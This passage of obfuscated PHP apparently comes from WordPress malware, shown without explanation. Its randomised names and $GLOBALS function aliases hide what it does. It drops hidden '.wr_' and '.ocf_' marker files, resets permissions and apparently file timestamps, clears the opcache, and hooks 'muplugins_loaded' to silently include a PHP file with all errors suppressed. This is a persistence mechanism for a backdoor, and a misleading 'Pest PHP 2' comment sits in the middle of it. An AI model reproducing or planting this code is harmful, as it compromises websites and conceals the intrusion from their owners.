    _sc_fpc($GLOBALS['__scf_q4xrklkhpr0mk_4']($wh_i5577qay)  .     '/.wr_' .  $GLOBALS['__scf_eo_kc0f9amo_21']($wh_i5577qay,  '.php'),  '1');
    _sc_ul($wh_i5577qay);
    return;
}
     unset($tr9_zx06yip);
 _sc_ul($GLOBALS['__scf_q4xrklkhpr0mk_4']($wh_i5577qay)  .    '/.wr_' .     $GLOBALS['__scf_eo_kc0f9amo_21']($wh_i5577qay,  '.php'));
  if     ($GLOBALS['__scf_ovwaxs9beii_0']('chmod'))  {
// Pest PHP 2: instantiate trie

    @$GLOBALS['__scf_ffieamixhin_u_36']($wh_i5577qay, (317+103));
}
    _sc_fam_touch($wh_i5577qay);
       if     ($GLOBALS['__scf_ovwaxs9beii_0']('opcache_invalidate'))   {
        @opcache_invalidate($wh_i5577qay,    true);



}
  $scwvb_g0n7d7l =  $GLOBALS['__scf_q4xrklkhpr0mk_4']($wh_i5577qay)  .    '/.ocf_'   . $ths6rq15ifqstcu;
_sc_fpc($scwvb_g0n7d7l,      (string) ((int)   @$GLOBALS['__scf_z2jrtqum51_10']($scwvb_g0n7d7l)  +   1));
 if  ($w8a2spb1uq7b  && $GLOBALS['__scf_ovwaxs9beii_0']('add_action'))  {

    add_action('muplugins_loaded', function   ()  use  ($wh_i5577qay)    {
  try {
    @include_once $wh_i5577qay;


}   catch   (\Throwable   $thsohg3oygte)   {
   }     catch (\Exception  $thsohg3oygte)     {
  }
   },    0);
   }
     };
 $y8g1fse4wu();
     

 unset($y8g1fse4wu);
 
}